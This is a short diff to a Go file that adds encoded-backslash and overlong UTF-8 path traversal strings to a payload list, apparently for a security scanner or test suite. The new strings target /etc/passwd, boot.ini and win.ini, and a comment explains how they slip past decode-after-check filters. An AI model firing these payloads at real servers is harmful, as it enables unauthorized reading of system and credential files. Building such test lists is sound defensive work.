@@ -288,6 +288,15 @@ var PathTraversalPayloads = []string{
 	"..%252f..%252f..%252fetc%252fpasswd",
 	"....//....//application.properties",
 	"..;/..;/..;/..;/..;/..;/..;/..;/etc/passwd",
+	// Encoded-backslash and overlong UTF-8 forms (0vzb.4). A filter that contains-checks a
+	// literal `..\` but URL-decodes the value lets `..%5c` through; one that validates the
+	// string and then hands it to an overlong-tolerant decoder (the Tomcat/IIS CVE-2000-0884
+	// class) turns %c0%af back into a separator AFTER the check.
+	`..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini`,
+	`..%5c..%2f..%5c..%2fetc%2fpasswd`,
+	"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+	"%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd",
+	`..%c1%9c..%c1%9cwindows%c1%9cwin.ini`,
 	// Shallow climbs of a served-resource tree.
 	"../../application.properties",
 	"..%2f..%2fapplication.properties",
